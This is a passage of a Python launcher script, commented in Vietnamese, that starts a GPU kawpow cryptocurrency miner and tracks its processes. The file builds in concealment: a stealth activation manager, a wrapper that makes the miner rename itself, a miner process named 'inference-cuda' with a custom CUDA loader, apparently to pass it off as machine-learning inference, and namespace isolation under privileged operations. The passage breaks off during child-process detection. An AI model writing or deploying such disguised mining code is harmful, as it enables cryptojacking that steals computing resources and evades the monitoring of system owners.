"""
start_mining.py

Điểm khởi đầu chính để khởi động toàn bộ hệ thống khai thác tiền điện tử.
"""

import os
import sys
import subprocess
import threading
import signal
import time
import re
import logging
import json
import select
from pathlib import Path
from datetime import datetime

# Thêm thư mục **script** (kịch bản) vào sys.path để **resolve** (phân giải đường dẫn) các **local module imports** (nhập module cục bộ)
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import psutil
# **GPU-Only Mode** (chế độ chỉ GPU – chỉ sử dụng card đồ họa): Tất cả chức năng khai thác **CPU** (bộ xử lý trung tâm) đã được loại bỏ vĩnh viễn

# **Import** (nhập khẩu – nạp thư viện) các **core mining environment modules** (module môi trường khai thác cốt lõi – thành phần chính của hệ thống)
from mining_environment.scripts.logging_config import setup_logging
from mining_environment.scripts.module_loggers import (
    get_gpu_plugin_logger,
    get_start_mining_logger,
    log_gpu_plugin_operation
)
from mining_environment.scripts import setup_env
from mining_environment.scripts.resource_manager import ResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
from mining_environment.scripts.privileged_operations import get_privileged_manager

# **Import stealth activation manager** (nhập trình quản lý kích hoạt ẩn – module điều khiển chế độ ẩn danh)
from mining_environment.stealth.core.stealth_activation_manager import initialize_stealth_activation, cleanup_stealth_activation
# **Enhanced PID Logger** (bộ ghi PID nâng cao – công cụ theo dõi ID tiến trình) với **real process output monitoring** (giám sát đầu ra tiến trình thực – theo dõi kết quả trực tiếp)
from pid_logger import start_worker, log_pid, register_process





# **Setup log directory path** (thiết lập đường dẫn thư mục log – cấu hình nơi lưu nhật ký)
LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
os.makedirs(LOGS_DIR, exist_ok=True)

# **Main application logger** (bộ ghi log ứng dụng chính – công cụ ghi nhật ký toàn hệ thống)
logger = get_start_mining_logger()

# **GPU-specific loggers** (bộ ghi log riêng cho GPU – công cụ ghi nhật ký card đồ họa)
gpu_miner_logger = setup_logging('gpu_miner', str(Path(LOGS_DIR) / 'gpu_miner.log'), 'INFO')
gpu_plugin_logger = setup_logging('gpu_plugin', str(Path(LOGS_DIR) / 'gpu_plugin.log'), 'INFO')

stop_event = threading.Event()

# **Enhanced lock-free process manager** (trình quản lý tiến trình không khóa nâng cao – quản lý quy trình không xung đột)
import weakref

class LockFreeProcessManager:
    """**Enhanced process manager** (trình quản lý tiến trình nâng cao – quản lý quy trình khai thác) với **dual PID tracking** (theo dõi PID kép – giám sát cả wrapper và process thực) và **graceful shutdown** (tắt mượt mà – kết thúc an toàn)"""
    def __init__(self):
        self._gpu_process_ref = None
        self._real_mining_pid = None
        self._process_group_id = None
        self._health_event = threading.Event()
        self._cleanup_callbacks = []
        
    def set_gpu_process(self, process, real_mining_pid=None, process_group_id=None):
        """**Register process** (đăng ký tiến trình – lưu thông tin quy trình) với **dual PID tracking** (theo dõi PID kép – giám sát cả wrapper và process thực)"""
        if process:
            self._gpu_process_ref = weakref.ref(process)
            self._real_mining_pid = real_mining_pid
            self._process_group_id = process_group_id
            self._health_event.set()
            logger.info(f"🎯 [ENHANCED] **Process** (tiến trình – quy trình chạy) đã đăng ký: **wrapper_pid** (PID tiến trình bọc)={process.pid}, **real_pid** (PID thực tế)={real_mining_pid}, **pgid** (ID nhóm tiến trình)={process_group_id}")
        else:
            self._gpu_process_ref = None
            self._real_mining_pid = None
            self._process_group_id = None
            self._health_event.clear()
    
    def get_gpu_process_status(self):
        """**Check status** (kiểm tra trạng thái – xác minh tình trạng hoạt động) của cả **wrapper** (tiến trình bọc – process chứa) và **real mining processes** (tiến trình khai thác thực – quy trình chính)"""
        if not self._health_event.is_set():
            return False, None, None
            
        wrapper_alive = False
        real_alive = False
        
        # Check wrapper process
        if self._gpu_process_ref:
            wrapper_process = self._gpu_process_ref()
            wrapper_alive = wrapper_process and wrapper_process.poll() is None
            
        # Check real mining process  
        if self._real_mining_pid:
            try:
                import psutil
                real_process = psutil.Process(self._real_mining_pid)
                real_alive = real_process.is_running() and real_process.status() != 'zombie'
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                real_alive = False
                
        # Process alive if either wrapper or real process is running
        is_alive = wrapper_alive or real_alive
        
        if not is_alive:
            self._health_event.clear()
            
        return is_alive, self._gpu_process_ref() if self._gpu_process_ref else None, self._real_mining_pid
    
    def register_cleanup_callback(self, callback):
        """**Register thread-safe cleanup callback** (đăng ký callback dọn dẹp an toàn luồng – hàm gọi lại không xung đột) cho **graceful shutdown** (tắt mượt mà – kết thúc an toàn)"""
        import threading
        with threading.RLock():
            self._cleanup_callbacks.append(callback)
            logger.debug(f"🔧 [ENHANCED] **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) đã đăng ký: {callback.__name__ if hasattr(callback, '__name__') else 'anonymous'}")
    
    def graceful_shutdown(self):
        """**Enhanced graceful shutdown** (tắt mượt mà nâng cao – kết thúc an toàn cải tiến) với **process group cleanup** (dọn dẹp nhóm tiến trình – xóa toàn bộ process liên quan)"""
        logger.info("🔄 [ENHANCED] Bắt đầu **graceful shutdown** (tắt mượt mà – kết thúc an toàn)...")
        
        # Execute cleanup callbacks
        for callback in self._cleanup_callbacks:
            try:
                callback()
            except Exception as e:
                logger.warning(f"⚠️ **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) thất bại: {e}")
        
        # Terminate process group if available
        if self._process_group_id:
            try:
                import os
                import signal
                os.killpg(self._process_group_id, signal.SIGTERM)
                logger.info(f"🔄 [ENHANCED] Đã gửi **SIGTERM** (tín hiệu kết thúc – yêu cầu dừng nhẹ nhàng) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
                
                # Wait briefly then force kill if needed
                time.sleep(2)
                try:
                    os.killpg(self._process_group_id, signal.SIGKILL)
                    logger.info(f"🔄 [ENHANCED] Đã gửi **SIGKILL** (tín hiệu buộc dừng – lệnh kết thúc ngay lập tức) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
                except ProcessLookupError:
                    logger.info("✅ [ENHANCED] **Process group** (nhóm tiến trình – tập hợp process liên quan) đã được kết thúc")
                    
            except Exception as e:
                logger.error(f"❌ [ENHANCED] Dọn dẹp **process group** (nhóm tiến trình – tập hợp process liên quan) thất bại: {e}")
        
        # Clear all references
        self._gpu_process_ref = None
        self._real_mining_pid = None 
        self._process_group_id = None
        self._health_event.clear()

    def graceful_terminate(self, timeout=30):
        """**Gracefully terminate** (kết thúc êm ái – dừng an toàn) tất cả **tracked processes** (tiến trình được theo dõi – quy trình đang giám sát) với **proper signal ordering** (thứ tự tín hiệu đúng – trình tự gửi tín hiệu hợp lý)"""
        logger.info("🔄 [ENHANCED] Bắt đầu **graceful terminate** (kết thúc êm ái – dừng an toàn)...")
        
        # Execute cleanup callbacks
        for callback in self._cleanup_callbacks:
            try:
                callback()
            except Exception as e:
                logger.warning(f"⚠️ **Cleanup callback** (callback dọn dẹp – hàm gọi lại xóa tài nguyên) thất bại: {e}")
        
        # Terminate process group if available
        if self._process_group_id:
            try:
                import os
                import signal
                os.killpg(self._process_group_id, signal.SIGTERM)
                logger.info(f"🔄 [ENHANCED] Đã gửi **SIGTERM** (tín hiệu kết thúc – yêu cầu dừng nhẹ nhàng) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
                
                # Wait briefly then force kill if needed
                time.sleep(2)
                try:
                    os.killpg(self._process_group_id, signal.SIGKILL)
                    logger.info(f"🔄 [ENHANCED] Đã gửi **SIGKILL** (tín hiệu buộc dừng – lệnh kết thúc ngay lập tức) tới **process group** (nhóm tiến trình – tập hợp process liên quan) {self._process_group_id}")
                except ProcessLookupError:
                    logger.info("✅ [ENHANCED] **Process group** (nhóm tiến trình – tập hợp process liên quan) đã được kết thúc")
                    
            except Exception as e:
                logger.error(f"❌ [ENHANCED] Dọn dẹp **process group** (nhóm tiến trình – tập hợp process liên quan) thất bại: {e}")
        
        # Clear all references
        self._gpu_process_ref = None
        self._real_mining_pid = None 
        self._process_group_id = None
        self._health_event.clear()

# **Global lock-free manager instance** (thể hiện trình quản lý không khóa toàn cục – đối tượng quản lý dùng chung)
process_manager = LockFreeProcessManager()
gpu_process = None  # **Compatibility** (tương thích – giữ lại để tương thích với code cũ)

# Thêm biến privileged_manager_global để chia sẻ kết quả thiết lập môi trường giữa các luồng
privileged_manager_global = None

# **SIMPLIFIED**: Remove unused threading events - sequential execution only

def signal_handler(signum, frame):
    """Enhanced signal handler với graceful shutdown coordination"""
    logger.info(f"🔄 [ENHANCED] Đã nhận **shutdown signal** (tín hiệu tắt – lệnh dừng hệ thống) ({signum}). Bắt đầu **graceful shutdown** (tắt mượt mà – kết thúc an toàn)...")
    
    # Set stop event for main loop
    stop_event.set()
    
    # Trigger graceful shutdown through process manager
    try:
        process_manager.graceful_shutdown()
        logger.info("✅ [ENHANCED] **Process manager** (trình quản lý tiến trình – quản lý quy trình) **graceful shutdown** (tắt mượt mà – kết thúc an toàn) hoàn tất")
    except Exception as e:
        logger.error(f"❌ [ENHANCED] **Graceful shutdown** (tắt mượt mà – kết thúc an toàn) thất bại: {e}")
    
    logger.info("🔄 [ENHANCED] Xử lý **signal handler** (bộ xử lý tín hiệu – hàm xử lý lệnh hệ thống) hoàn tất")

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def initialize_environment():
    """**Thread-safe environment initialization** (khởi tạo môi trường an toàn luồng) với **enhanced error handling** (xử lý lỗi nâng cao)"""
    logger.info("Bắt đầu thiết lập môi trường khai thác (Thread-Safe Mode).")
    
    try:
        # **Step 1: Privileged Manager** (Bước 1: Trình quản lý đặc quyền)
        logger.info("🔐 Khởi tạo **Environment** (môi trường – hệ thống hoạt động) đã được khởi tạo thành công **privileged manager** (trình quản lý đặc quyền – quản lý hoạt động cần quyền cao)...")
        privileged_manager = get_privileged_manager(logger)
        
        # **Step 2: Security Context Validation** (Bước 2: Xác thực bối cảnh bảo mật)
        logger.info("🔒 Xác thực **security context** (bối cảnh bảo mật – thông tin quyền hạn và bảo mật)...")
        security_context = privileged_manager.validate_security_context()
        logger.info(f"✅ Bối cảnh bảo mật: User={security_context['user']}, Root={security_context['is_root']}")
        
        if not security_context['is_root']:
            logger.warning("⚠️ Không chạy với quyền root - một số tính năng có thể không hoạt động")
        
        # **Step 3: GPU Access Check** (Bước 3: Kiểm tra truy cập GPU)
        logger.info("🎮 Kiểm tra **GPU access** (truy cập GPU – quyền sử dụng card đồ họa)...")
        gpu_info = privileged_manager.check_gpu_access()
        logger.info(f"✅ Truy cập GPU: Available={gpu_info['nvidia_smi_available']}, Count={gpu_info['gpu_count']}")
        
        # **Step 4: eBPF Filter Loading** (Bước 4: Tải bộ lọc eBPF) - DISABLED
        # DISABLE eBPF GPU telemetry để giải quyết lỗi std::bad_alloc
        logger.info("ℹ️ **eBPF GPU telemetry** (giám sát GPU qua eBPF – theo dõi hiệu suất GPU) đã được DISABLE để tránh **memory conflicts** (xung đột bộ nhớ – lỗi tranh chấp RAM)")

        logger.info("🌍 Chạy **centralized environment setup** (thiết lập môi trường tập trung – cấu hình chung cho hệ thống)...")
        setup_env.setup()
        logger.info("✅ Thiết lập môi trường thành công.")
        
        return privileged_manager
        
    except Exception as e:
        error_msg = f"Lỗi khi thiết lập môi trường: {e}"
        logger.error(f"❌ {error_msg}")
        logger.error(f"🔍 Chi tiết **exception** (ngoại lệ – lỗi bất thường): {type(e).__name__}: {str(e)}")
        
        # **Thread-safe error propagation** (truyền lỗi an toàn luồng)
        stop_event.set()
        raise RuntimeError(error_msg) from e
        
def is_mining_process_running(process):
    """
    ✅ ENHANCED: Kiểm tra tiến trình khai thác còn "sống" (running) hay không.
    - Trả về True khi `.poll()` chưa có mã thoát (None) **hoặc** mã thoát = 0 
      (một số wrapper script fork rồi thoát 0 ngay lập tức – nhưng tiến trình con vẫn chạy).
    """
    return bool(process) and (process.poll() is None or process.returncode == 0)

def rotate_log_file(log_path, max_size_mb=100, max_files=5):
    """
    **Log rotation utility** (tiện ích xoay vòng tệp ghi nhật ký – công cụ quản lý kích thước log) giữ lại **archives** (lưu trữ – bản sao lưu cũ) với **size limits** (giới hạn kích thước – ngưỡng dung lượng tối đa).
    
    Args:
        log_path: Đường dẫn tệp **log** (nhật ký – file ghi thông tin hoạt động)  
        max_size_mb: **Max size** (kích thước tối đa – dung lượng lớn nhất) trước khi **rotate** (xoay vòng – tạo file mới) (MB)
        max_files: Số lượng **archive files** (tệp lưu trữ – file sao lưu) tối đa
    """    
    if not os.path.exists(log_path):
        return
        
    file_size_mb = os.path.getsize(log_path) / (1024 * 1024)
    if file_size_mb > max_size_mb:
        os.remove(log_path)
        logger.info(f"Đã xóa tệp log do vượt quá {max_size_mb}MB: {log_path} (kích thước: {file_size_mb:.2f}MB)")

# Preflight pool check and related helpers removed to simplify startup

def monitor_process_output(process, process_name, log_file, thread_logger):
    """
    **Monitor process output** (giám sát đầu ra tiến trình) - **simplified version** (phiên bản đơn giản) của dual_logger_thread.
    
    Args:
        process: **Process object** (đối tượng tiến trình)
        process_name (str): **Process name** (tên tiến trình) 
        log_file: **Log file handle** (tay cầm tệp log)
        thread_logger: **Thread logger instance** (thể hiện logger luồng)
    """
    try:
        thread_logger.info(f"🔍 Started monitoring output for {process_name}")
        
        while True:
            # Read output with timeout
            ready, _, _ = select.select([process.stdout], [], [], 1.0)
            if not ready:
                continue
                
            line = process.stdout.readline()
            if not line:
                break
                
            # Format and log the line
            formatted_line = f"[{process_name}] {line.decode('utf-8', errors='ignore').strip()}"
            thread_logger.debug(formatted_line)
            
            # Write to log file
            if log_file:
                log_file.write(formatted_line + '\n')
                log_file.flush()
                
    except Exception as e:
        thread_logger.error(f"❌ Error reading process output: {e}")
    finally:
        thread_logger.info(f"🔚 Stopped monitoring output for {process_name}")

def dual_logger_thread(process, log_file, process_name, log_lock):
    """**Enhanced dual logging thread** (luồng ghi log kép nâng cao – luồng ghi nhật ký song song cải tiến) cho **real-time data streaming** (truyền dữ liệu thời gian thực) với **hash rate detection** (phát hiện tốc độ băm)"""
    # **Select appropriate logger** (chọn logger phù hợp) dựa trên loại tiến trình
    thread_logger = gpu_miner_logger if 'gpu' in process_name.lower() else logger
    hash_rates = []  # **Track hash rates** (theo dõi tốc độ băm) cho **performance metrics** (chỉ số hiệu suất)
    start_time = time.time()
    line_count = 0
    
    try:
        while True:
            # **Non-blocking I/O** (nhập/xuất không chặn) với **select** cho **data processing** (xử lý dữ liệu)
            ready, _, _ = select.select([process.stdout], [], [], 1.0)
            if not ready:
                if process.poll() is not None:  # **Process terminated** (tiến trình đã kết thúc)
                    break
                continue

            line = process.stdout.readline()
            if line == '' and process.poll() is not None:  # **EOF detection** (phát hiện kết thúc tệp)
                break
                
            if line:
                line_count += 1
                
                # **Thread-safe logging block** (khối ghi nhật ký an toàn luồng)
                with log_lock:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    runtime = time.time() - start_time
                    
                    # **Enhanced log format** (định dạng nhật ký nâng cao) với **runtime info** (thông tin thời gian vận hành)
                    formatted_line = f"[{timestamp}][{process_name}][R:{runtime:.0f}s] {line.strip()}"
                    
                    # **Color-coded terminal output** (đầu ra terminal có mã màu – hiển thị với màu sắc phân biệt)
                    if "error" in line.lower() or "failed" in line.lower():
                        terminal_output = f"\033[91m{formatted_line}\033[0m"  # Red
                    elif "H/s" in line or "accepted" in line.lower():
                        terminal_output = f"\033[92m{formatted_line}\033[0m"  # Green
                    elif "connecting" in line.lower() or "started" in line.lower():
                        terminal_output = f"\033[94m{formatted_line}\033[0m"  # Blue
                    else:
                        terminal_output = formatted_line
                    
                    # **Real-time terminal display** (hiển thị terminal thời gian thực – cập nhật ngay lập tức)
                    print(terminal_output, flush=True)

                    # **Noise control** (khống chế trùng lặp log): tránh nhân bản dòng từ child vào start_mining
                    # Bật lại bằng RELOG_CHILD_OUTPUT=1 nếu cần soi chi tiết
                    if os.getenv('RELOG_CHILD_OUTPUT', '0').lower() in ('1', 'true', 'yes'):
                        thread_logger.info(f"[{process_name}][R:{runtime:.0f}s] {line.strip()}")
                    
                    # **LEGACY: Keep binary file write for compatibility** (cũ: giữ ghi file nhị phân để tương thích)
                    log_file.write(f"{formatted_line}\n".encode('utf-8'))
                    log_file.flush()
                    
                    # **Log rotation check** (kiểm tra xoay vòng tệp nhật ký) - **delete when over 3MB** (xóa khi vượt quá 3MB)
                    try:
                        if log_file.tell() > 3 * 1024 * 1024:  # 3MB limit
                            current_path = log_file.name
                            log_file.close()
                            os.remove(current_path)
                            logger.info(f"🗑️ Đã xóa log do vượt quá 3MB: {current_path}")
                            # **Reopen new file** (mở lại tệp mới)
                            log_file = open(current_path, 'ab', buffering=0)
                    except Exception as rot_err:
                        logger.warning(f"⚠️ Xóa log thất bại: {rot_err}")
                    
                    # **Advanced hash rate detection** (phát hiện tốc độ băm nâng cao – nhận diện các chỉ số hiệu suất)
                    hash_rate_match = re.search(r'(\d+(?:\.\d+)?)\s*(H/s|KH/s|MH/s|GH/s|TH/s)', line)
                    if hash_rate_match:
                        hash_rate = float(hash_rate_match.group(1))
                        unit = hash_rate_match.group(2)
                        
                        # **Unit conversion** (chuyển đổi đơn vị đo lường)
                        multiplier = {
                            'H/s': 1,
                            'KH/s': 1000,
                            'MH/s': 1000000,
                            'GH/s': 1000000000,
                            'TH/s': 1000000000000
                        }
                        hash_rate_hz = hash_rate * multiplier.get(unit, 1)
                        
                        # **Hash rate tracking** (theo dõi và lưu trữ tốc độ băm)
                        hash_rates.append(hash_rate_hz)
                        
                        # **Performance metrics calculation** (tính toán các chỉ số hiệu suất chi tiết)
                        if len(hash_rates) >= 5:  # **Moving average** (trung bình trượt) của 5 mẫu dữ liệu
                            recent_avg = sum(hash_rates[-5:]) / 5
                            total_avg = sum(hash_rates) / len(hash_rates)
                            
                            # **Real-time metrics display** (hiển thị các chỉ số thời gian thực)
                            metrics_line = (f"\033[96m📊 METRICS [{process_name}]: "
                                          f"Current={hash_rate:.2f} {unit} | "
                                          f"Avg5={recent_avg:.2f} H/s | "
                                          f"TotalAvg={total_avg:.2f} H/s | "
                                          f"Samples={len(hash_rates)} | "
                                          f"Runtime={runtime:.0f}s\033[0m")
                            print(metrics_line, flush=True)
                        
                    
                    # **Status indicators** (chỉ báo trạng thái hoạt động) mỗi 100 dòng
                    if line_count % 100 == 0:
                        status_line = (f"\033[93m📈 STATUS [{process_name}]: "
                                     f"Lines={line_count} | Runtime={runtime:.0f}s | "
                                     f"HashSamples={len(hash_rates)}\033[0m")
                        print(status_line, flush=True)
                        
    except Exception as e:
        error_msg = f"❌ Lỗi trong **dual_logger_thread** (luồng ghi log kép – luồng ghi nhật ký song song) [{process_name}]: {e}"
        logger.error(error_msg)
        print(f"\033[91m{error_msg}\033[0m", flush=True)
    finally:
        # **Cleanup** (dọn dẹp tài nguyên) và **final stats** (thống kê cuối cùng)
        try:
            if log_file and not log_file.closed:
                log_file.close()
            
            runtime = time.time() - start_time
            final_stats = (f"\033[95m🏁 FINAL STATS [{process_name}]: "
                         f"Runtime={runtime:.0f}s | Lines={line_count} | "
                         f"HashSamples={len(hash_rates)}")
            if hash_rates:
                total_avg = sum(hash_rates) / len(hash_rates)
                final_stats += f" | AvgHashRate={total_avg:.2f} H/s"
            final_stats += "\033[0m"
            
            print(final_stats, flush=True)
            logger.info(f"**Dual logging thread** (luồng ghi log kép – luồng ghi nhật ký song song) đã dừng cho {process_name}: **runtime** (thời gian chạy – thời lượng hoạt động) {runtime:.0f}s")
            
        except Exception as cleanup_err:
            logger.error(f"Lỗi **cleanup** (dọn dẹp – làm sạch tài nguyên) trong **dual_logger_thread** (luồng ghi log kép – luồng ghi nhật ký song song): {cleanup_err}")

def start_gpu_mining_process(retries=3, delay=5, privileged_manager=None):
    """
    **GPU-only Enhanced mining process** (quy trình khai thác GPU nâng cao) với **dual logging** (ghi nhật ký kép), 
    **log rotation** (xoay vòng tệp nhật ký), và **thread-safe logging** (ghi nhật ký an toàn luồng).
    
    Args:
        retries (int): Số lần thử lại tối đa
        delay (int): Thời gian chờ giữa các lần thử (giây)
        privileged_manager: Trình quản lý quyền hạn
    
    Returns:
        subprocess.Popen: Tiến trình khai thác GPU nếu thành công, None nếu thất bại
    """
    # **🔧 DEBUG: GPU-only function entry logging** (ghi log đầu vào function GPU-only – ghi nhật ký điểm vào hàm chỉ GPU)  
    logger.info(f"🔍 [DEBUG] **start_gpu_mining_process()** (hàm khởi động tiến trình khai thác GPU) được gọi - **GPU-only mode** (chế độ chỉ GPU – chỉ dùng card đồ họa)")
    
    executable = os.getenv('CUDA_COMMAND')
    logger.info(f"🔍 [DEBUG] **GPU Executable path** (đường dẫn thực thi GPU – vị trí file chạy card đồ họa): {executable}")
    if not executable or not os.path.isfile(executable) or not os.access(executable, os.X_OK):
        logger.error(f"**GPU executable** (file thực thi GPU – chương trình chạy card đồ họa) không hợp lệ hoặc không có quyền truy cập: {executable}")
        stop_event.set()
        return None

    mining_server = os.getenv('MINING_SERVER_GPU')
    mining_wallet = os.getenv('MINING_WALLET_GPU')
    if not mining_server or not mining_wallet:
        logger.error("Các **environment variables** (biến môi trường – tham số hệ thống) MINING_SERVER hoặc MINING_WALLET chưa được cấu hình.")
        stop_event.set()
        return None

    # Preflight pool/server check removed to simplify startup

    miner_tag = 'gpu'
    miner_log_path = Path(LOGS_DIR) / f"{miner_tag}_miner.log"
    
    # **Log rotation** (xoay vòng tệp nhật ký) trước khi khởi chạy tiến trình
    rotate_log_file(str(miner_log_path))
    
    # **Thread-safe lock** (khóa an toàn luồng) cho **dual logging** (ghi nhật ký kép)
    log_lock = threading.Lock()

    # **GPU process name** (tên tiến trình GPU) cố định
    process_name = "inference-cuda"
    
    # **GPU Plugin logging integration** (tích hợp ghi log plugin GPU)
    log_gpu_plugin_operation("PROCESS_STARTUP", f"Starting {process_name} mining process", "INFO")
    
    # **GPU mining command** (lệnh khai thác GPU) construction – đặt tham số thuật toán **trước** để tránh chế độ PCA
    # Mandatory custom CUDA loader (required): libmlls-cuda.so
    cuda_loader = os.getenv('MLLS_CUDA', '/usr/local/bin/libmlls-cuda.so')

    # 🔍 DEBUG: Validate CUDA loader exists before use
    if not os.path.exists(cuda_loader):
        logger.error(f"❌ **CUDA loader** bắt buộc không tìm thấy: {cuda_loader} (yêu cầu libmlls-cuda.so)")
        stop_event.set()
        return None

    logger.info(f"🎮 **GPU Mining** - **Mandatory CUDA loader**: {cuda_loader} (exists={os.path.exists(cuda_loader)})")

    # 🎯 Build command với cấu trúc rõ ràng: exec → thuật toán → pool → wallet → TLS → CUDA opts
    mining_command = [
        executable,
        '-a', 'kawpow',                 # Thuật toán bắt buộc đặt đầu để binary không vào PCA mode
        '-o', mining_server,
        '-u', mining_wallet,
        '--tls',
        '--cuda',
        f'--cuda-loader={cuda_loader}'
    ]
    # Thêm tuỳ chọn intensity để kiểm soát mức sử dụng VRAM (Giảm lỗi DAG out-of-memory)
    intensity_env = os.getenv('GPU_INTENSITY')
    if intensity_env:
        # mining_command.extend(['--intensity', intensity_env])  # removed because inference-cuda does not support --intensity
        logger.warning("⚠️ **GPU_INTENSITY** (cường độ GPU – mức sử dụng card đồ họa) được phát hiện nhưng bị bỏ qua; **--intensity** (tham số cường độ) không được hỗ trợ bởi **inference-cuda** (chương trình khai thác)")
    else:
        logger.info("🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - **INTENSITY parameter** (tham số cường độ – thiết lập mức sử dụng) đã tắt (**unsupported by binary** – không được hỗ trợ bởi file thực thi)")
    logger.info(f"🎮 **GPU Mining** (khai thác GPU – đào coin bằng card đồ họa) - CHÍNH XÁC: Sử dụng **CUDA backend** (nền tảng CUDA – công nghệ tính toán GPU) với **kawpow algorithm** (thuật toán kawpow – giải thuật khai thác) cho **inference-cuda** (chương trình khai thác)")

    enable_ns = os.getenv('ENABLE_NS_ISOLATION', '1') == '1'
    enable_stealth = os.getenv('ENABLE_STEALTH_MODE', '1') == '1'
    
    if enable_ns and privileged_manager:
        logger.info("Sử dụng **PrivilegedOperationManager** (trình quản lý thao tác đặc quyền – công cụ điều khiển quyền cao) cho **namespace isolation** (cô lập không gian tên – tách biệt môi trường)")

    # ✅ GPU Environment Cleanup now handled by stealth_inference_cuda.py internally
    # No need for subprocess_env preparation here - stealth wrapper handles it
    # Tạo môi trường sạch, loại bỏ LD_PRELOAD để ngăn hook GPU làm sai cấu hình
    subprocess_env = os.environ.copy()
    subprocess_env.pop('LD_PRELOAD', None)
    
    for attempt in range(1, retries + 1):
        logger.info(f"Thử khởi chạy **GPU mining process** (quá trình khai thác GPU – tiến trình đào coin card đồ họa) (**Attempt** {attempt}/{retries} – lần thử {attempt}/{retries})...")
        # **Debug logging** (ghi nhật ký gỡ lỗi) cho **GPU process creation** (tạo tiến trình GPU)
        logger.info(f"🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Command** (lệnh – câu lệnh thực thi): {' '.join(mining_command)}")
        logger.info(f"🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Stealth** (ẩn danh – chế độ ẩn): {enable_stealth}, **NS** (namespace – không gian tên): {enable_ns}")
        logger.info(f"🔍 **GPU Debug** (gỡ lỗi GPU – kiểm tra card đồ họa) - **Environment** (môi trường – biến hệ thống): Default (**stealth wrapper** (trình bao bọc ẩn danh) sẽ tạo **clean_env** – môi trường sạch)")
        try:
            # **Create GPU subprocess** (tạo tiến trình con GPU) với **PIPE** (đường ống) cho **dual logging** (ghi log kép)
            if enable_stealth:
                # **GPU Stealth Wrapper** (wrapper ẩn danh GPU) - RESTORED: Use correct inference-cuda wrapper
                stealth_wrapper_path = os.path.join(
                    os.path.dirname(os.path.abspath(__file__)),
                        "mining_environment", "stealth", "wrappers", "stealth_inference_cuda.py"
                    )
                
                if os.path.exists(stealth_wrapper_path):
                    # Sử dụng **[Self-Stealth Wrapper]** (wrapper tự ẩn danh) thay vì external spoof
                    stealth_command = [sys.executable, stealth_wrapper_path] + mining_command[1:]  # Remove executable, keep args
                    miner_type = 'GPU'  # GPU-only mining
                    logger.info(f"🔒 [SELF-STEALTH] Using {miner_type} stealth wrapper: {stealth_wrapper_path}")
                    logger.info(f"🔍 [DEBUG] About to call subprocess.Popen with command: {stealth_command}")
                    
                    process = subprocess.Popen(
                        stealth_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1,
                        env=subprocess_env
                    )
                    logger.info(f"🔍 [DEBUG] subprocess.Popen completed successfully")
                    if process:
                        logger.info(f"✅ [SELF-STEALTH] {miner_type} stealth process started with PID: {process.pid}")
                        logger.info(f"🔍 [SELF-STEALTH] {miner_type} process will self-rename using internal stealth manager")
                else:
                    # Fallback to standard subprocess nếu wrapper không tồn tại
                    miner_type = 'GPU'  # GPU-only mining
                    logger.warning(f"⚠️ [SELF-STEALTH] {miner_type} stealth wrapper not found: {stealth_wrapper_path}")
                    logger.warning(f"⚠️ [SELF-STEALTH] Falling back to standard subprocess - no {miner_type} stealth")
                    logger.info(f"🔍 [DEBUG] About to call fallback subprocess.Popen with command: {mining_command}")
                    process = subprocess.Popen(
                        mining_command,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        universal_newlines=True,
                        bufsize=1,
                        env=subprocess_env
                    )
            elif enable_ns and privileged_manager:
                # **Namespace isolation** (cô lập namespace) - **modified for dual logging** (sửa đổi cho ghi log kép)
                logger.info("Đang sử dụng **Namespace isolation** (cô lập không gian tên – tách biệt môi trường quy trình)")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1,
                    env=subprocess_env
                )
            else:
                # **Standard subprocess** (tiến trình con tiêu chuẩn)
                logger.info(f"🔍 GPU using standard subprocess")
                process = subprocess.Popen(
                    mining_command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True,
                    bufsize=1,
                    env=subprocess_env
                )
            
            if process:
                startup_time = time.time()
                miner_type = 'GPU'  # GPU-only mining
                logger.info(f"🔍 {miner_type} process created successfully with PID: {process.pid}")
                
                # **Enhanced startup logging** (ghi log khởi động nâng cao)
                startup_msg = (f"🚀 MINING PROCESS STARTED [{miner_type}]\n"
                             f"   ├─ Process Name: {process_name}\n"
                             f"   ├─ PID: {process.pid}\n"
                             f"   ├─ Command: {' '.join(mining_command)}\n"
                             f"   ├─ Log File: {miner_log_path}\n"
                             f"   ├─ Stealth Mode: {enable_stealth}\n"
                             f"   └─ Namespace Isolation: {enable_ns and privileged_manager is not None}")
                
                logger.info(startup_msg)
                print(f"\033[92m{startup_msg}\033[0m", flush=True)  # Green startup message
                
                
                # Enhanced PID Logger: Detect Real Mining PID (for stealth wrapper case)
                try:
                        process_type = "gpu"  # GPU-only mode
                        
                        # Wait for stealth wrapper to spawn child process
                        time.sleep(4)  # Increased from 2s to 4s for stealth initialization
                        
                        # 🚀 [PID RELATIONSHIP DETECTION] - Stealth-resistant detection using parent-child relationships
                        wrapper_pid = process.pid  # Current wrapper PID (e.g., 997)
                        target_cmd = "inference-cuda"  # GPU-only mode  
                        real_mining_pid = None
                        
                        logger.info(f"🔍 [PID-DETECTION] Starting PID Relationship Detection for wrapper PID {wrapper_pid}")
                        
                        try:
                            # METHOD 1: Direct children detection using psutil.Process().children()
                            wrapper_process = psutil.Process(wrapper_pid)
                            children = wrapper_process.children(recursive=False)  # Limit to direct children to avoid deep scans
                            
                            logger.info(f"🔍 [PID-DETECTION] Found {len(children)} child process(es) of wrapper PID {wrapper_pid}")
                            
                            for child in children:
